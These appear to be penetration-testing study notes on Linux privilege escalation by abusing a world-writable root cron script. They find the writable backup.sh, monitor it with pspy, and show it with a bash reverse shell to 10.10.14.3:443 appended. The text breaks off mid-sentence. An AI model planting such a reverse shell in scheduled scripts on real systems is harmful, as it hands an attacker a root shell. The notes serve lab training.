look for any files/directories that are world-writeable

```shell-session
$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
```

## Check if its writeable

```shell-session
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
```

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [procfs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

Cron Job Abuse

```shell-session
$ ./pspy64 -pf -i 1000
```

# examp;le with tar

```shell-session
$ cat /dmz-backups/backup.sh

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

We can see that the script is j
